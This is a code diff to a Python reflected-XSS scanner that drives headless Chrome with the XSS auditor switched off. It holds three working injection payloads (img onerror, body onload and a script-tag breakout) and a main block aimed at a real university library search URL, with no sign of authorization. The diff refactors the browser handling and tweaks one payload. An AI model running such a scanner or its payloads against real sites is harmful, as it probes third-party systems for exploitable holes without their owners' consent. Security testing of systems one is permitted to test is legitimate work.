@@ -15,17 +15,20 @@ class Xss:
         self.chrome_options = webdriver.ChromeOptions()
         self.chrome_options.add_argument("--headless")
         self.chrome_options.add_argument("--disable-gpu")
+        # self.chrome_options.add_argument("--disable-logging")
+        self.chrome_options.add_argument("--log-level=3")
         self.chrome_options.add_argument("--window-size=1920x1080")
         self.chrome_options.add_argument("--disable-xss-auditor")
         # 禁用图片
         chrome_prefs = {}
         chrome_prefs["profile.default_content_settings"] = {"images": 2}
         self.chrome_options.experimental_options["prefs"] = chrome_prefs
+        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)
 
         self.header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
         self.payloads = ['\'"/><img src=# onerror=alert(1);>',
                          "\'\"><body onload=alert(1)>",
-                         "/></script><ScRiPt>alert(1);<ScRiPt><!--"]
+                         "/>\n</script><ScRiPt>alert(1);<ScRiPt><!--"]
 
     def init(self):
         if not self.target.startswith('http://') and not self.target.startswith('https://'):
@@ -50,11 +53,11 @@ class Xss:
                             print('可能存在xss漏洞\t'+target)
 
     def check(self, url):
-        driver = webdriver.Chrome(chrome_options=self.chrome_options)
-        driver.get(url)
+        self.driver.get(url)
         try:
-            alert = driver.switch_to.alert
+            alert = self.driver.switch_to.alert
             if alert.text == '1':
+                alert.accept()
                 return True
         except:
             pass
@@ -93,7 +96,8 @@ class Xss:
         for self.target in self.targets:
             self.init()
             self.reflect_xss()
+        self.driver.quit()
 
 
 if __name__ == '__main__':
-    Xss(['http://opac.jit.edu.cn/asord/asord_searchresult.php?type=02&q=&submit=%E6%A3%80%E7%B4%A2']).scan()
+    Xss(['http://opac.jit.edu.cn/asord/asord_redr.php?title=/']).scan()
